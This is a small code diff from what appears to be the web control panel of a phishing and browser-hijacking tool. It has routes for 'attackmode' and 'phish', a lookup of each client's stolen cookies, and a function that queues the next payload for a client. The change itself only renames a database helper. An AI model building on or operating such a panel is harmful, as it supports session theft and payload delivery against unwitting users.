@@ -42,7 +42,7 @@ def login():
 @frontend.route('/attackmode', methods=['GET', 'POST'])
 @login_required
 def attack_mode():
-    cur = database.getCursor()
+    cur = database.getConn()
     cur.execute("SELECT * FROM Client")
     data = cur.fetchall()
     active_users = [i[0] for i in app.connected_clients]
@@ -91,7 +91,7 @@ def phish():
 @frontend.route('/getinfo', methods=['POST'])
 def getinfo():
     userid = int(request.form['id'])
-    cur = database.getCursor()
+    cur = database.getConn()
     cur.execute('SELECT * FROM Client WHERE ID = (%s)', (userid,))
     record = cur.fetchone()
     cur.execute('SELECT * FROM Cookies WHERE CID = (%s)', (userid,))
@@ -107,7 +107,7 @@ def getinfo():
 
 
 def update_payload(id, text):
-    cur = database.getCursor()
+    cur = database.getConn()
     cur.execute("UPDATE Client SET NextPayload = concat(NextPayload, (%s), '\n') WHERE ID = (%s)", (text, id))
     database.conn.commit()
 
